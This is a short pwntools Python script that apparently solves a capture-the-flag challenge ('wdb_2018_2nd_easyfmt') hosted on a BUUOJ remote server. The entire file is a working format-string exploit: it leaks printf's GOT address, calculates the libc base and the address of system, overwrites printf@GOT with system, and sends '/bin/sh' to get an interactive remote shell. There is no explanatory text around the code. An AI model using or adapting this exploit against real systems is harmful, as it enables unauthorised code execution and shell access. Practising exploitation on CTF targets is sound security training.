from pwn import *


# p = process("./wdb_2018_2nd_easyfmt")
p = remote("node4.buuoj.cn", 26059)
pro = ELF("./wdb_2018_2nd_easyfmt")


offset = 6
printf_g = pro.got["printf"]

# leak
fmt = b"%7$s"+p32(printf_g)
p.send(fmt)
info = u32(p.recvuntil("\xf7")[-4:])
print("leak: ", hex(info))

# count
libc = ELF("/home/fanxinli/libc-so/libc-2.23-32.so")
base = info-libc.sym["printf"]
system = base+libc.sym["system"]
print("base: ", hex(base))

# alter printf_got to system
fmt = fmtstr_payload(offset=6, writes={printf_g:system})
p.send(fmt)

# attack
p.send("/bin/sh\x00")

p.interactive()


